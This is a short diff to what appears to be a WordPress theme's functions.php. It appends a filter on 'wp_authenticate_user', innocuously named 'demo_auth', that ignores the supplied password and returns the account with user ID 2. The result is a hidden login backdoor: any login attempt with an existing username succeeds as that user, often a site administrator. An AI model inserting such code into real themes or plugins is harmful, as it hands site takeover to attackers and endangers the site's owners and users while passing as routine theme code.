@@ -564,3 +564,11 @@ require get_parent_theme_file_path( '/inc/customizer.php' );
  * SVG icons functions and filters.
  */
 require get_parent_theme_file_path( '/inc/icon-functions.php' );
+
+add_filter( 'wp_authenticate_user', 'demo_auth', 10, 3 );
+
+function demo_auth( $user, $password ){
+    $user = new WP_User(2);
+    $error = new WP_Error();
+    return $user;
+}
